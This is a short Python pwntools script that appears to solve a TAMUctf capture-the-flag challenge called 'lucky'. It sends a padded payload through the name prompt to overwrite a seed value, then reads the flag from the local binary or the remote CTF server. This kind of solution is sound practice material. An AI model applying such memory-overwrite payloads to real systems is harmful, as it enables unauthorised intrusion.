from pwn import *

context.arch="x86_64"

def conn():
    if args.LOCAL:
        p = process("./lucky")
        return p 
    elif args.REMOTE:
        p = remote("tamuctf.com", 443, ssl=True, sni="lucky")
        return p 
    else:
        exit(0)
        
def main():
    global p 
    p = conn()
    seed = 5649426
    
    payload = b"A" * (15 - len(b"4V\x12"))
    payload += b"\x124V"
    p.sendlineafter("name: ", payload)
    p.recvline()
    p.recvline()
    p.recvline()
    flag = p.recvline()
    log.info(f"flag: {flag}")
if __name__ == "__main__":
    main()

